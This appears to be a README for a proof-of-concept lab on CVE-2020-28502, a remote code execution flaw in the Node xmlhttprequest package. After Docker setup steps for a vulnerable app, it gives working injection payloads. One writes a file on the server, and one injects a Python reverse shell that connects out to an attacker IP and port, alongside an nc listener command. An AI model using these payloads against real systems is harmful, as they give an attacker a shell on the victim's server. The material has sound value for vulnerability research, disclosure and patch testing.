# CVE-2020-28502 node-XMLHttpRequest RCE

## NVD Description

This affects the package xmlhttprequest before 1.7.0; all versions of package xmlhttprequest-ssl. Provided requests are sent synchronously (async=False on xhr.open), malicious user input flowing into xhr.send could result in arbitrary code being injected and run.

## Demo

![cve-2020-28502](https://user-images.githubusercontent.com/56715563/117973311-33620f80-b367-11eb-8335-c139ad8d7648.gif)

## Set Up

1. Build an image from a Dockerfile

```
$ docker build -t cve-2020-28502 .
```

2. Run node app.js in a new container

```
$ docker run --rm -p 3000:3000 cve-2020-28502
```

3. Access http://localhost:3000

![localhost-image](https://user-images.githubusercontent.com/56715563/117810837-d567f600-b29a-11eb-887c-1c8e807e454d.png)

## PoC Payload

### Add file

Submit Payload

```
\');require("fs").writeFileSync("./exploit.txt", "exploit!");req.end();//
```

### Reverse Shell

1. Listen client

```
$ nc -l 8888
```

2. Submit Payload

change ip address (192.168.0.25) to your local ip address

```
\');require("child_process").exec("python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.0.25\",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'");req.end();//
```

## Reference

- https://snyk.io/vuln/SNYK-JS-XMLHTTPREQUEST-1082935

